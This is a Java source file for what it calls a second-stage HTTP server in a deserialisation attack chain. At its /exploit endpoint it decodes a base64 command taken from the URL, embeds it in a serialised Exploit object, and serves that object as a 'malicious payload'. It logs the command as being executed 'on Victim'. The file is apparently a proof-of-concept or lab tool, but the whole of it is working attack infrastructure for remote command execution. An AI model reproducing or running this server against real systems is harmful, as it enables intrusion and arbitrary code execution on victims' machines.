package com.example;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.text.MessageFormat;
import java.util.Base64;

public class SecondStageHTTPServer {

    public static final String EXPLOIT = "/exploit";
    public static final String HELLO = "/hello";

    public static void main(String[] args) throws IOException {
        HttpServer httpServer = HttpServer.create(new InetSocketAddress("localhost", 8888), 0);
        httpServer.createContext("/", httpExchange -> {
            String address = httpExchange.getRemoteAddress().toString();
            String path  = httpExchange.getRequestURI().toString();
            String logRequestMess = MessageFormat.format("Receive Request from: {0} with path {1}", address, path);
            System.out.println(logRequestMess);

            if (path.startsWith(HELLO)) {
                sayHello(httpExchange);
            } else if (path.startsWith(EXPLOIT)) {
                String command = "";
                if (path.length() > EXPLOIT.length()) {
                    String base64Command = path.substring(EXPLOIT.length() + 1);
                    command = decodeBase64(base64Command);
                }
                supplyMaliciousPayload(httpExchange, command, address);
            }

            httpExchange.close();

        });
        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println("Second Stage Server listen at: " +
                httpServer.getAddress());
    }

    private static void sayHello(HttpExchange httpExchange) throws IOException {
        String answer = MessageFormat.format("Hello There, {0}", httpExchange.getRemoteAddress());
        byte[] response = answer.getBytes(StandardCharsets.UTF_8);
        httpExchange.sendResponseHeaders(200, response.length);
        httpExchange.getResponseBody().write(response);
    }


    private static void supplyMaliciousPayload(HttpExchange httpExchange, String command, String address) throws IOException {
        String logCommandMess = MessageFormat.format("Execute Command \"{0}\" on Victim {1}", command, address);
        System.out.println(logCommandMess);
        Exploit exploit = new Exploit();
        Exploit.setCmd(command);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(exploit);
        byte[] payload = baos.toByteArray();
        httpExchange.getResponseBody().write(payload);
        httpExchange.sendResponseHeaders(200, payload.length);
    }

    private static String decodeBase64(String encodedString) {
        return new String(Base64.getUrlDecoder().decode(encodedString));
    }

}
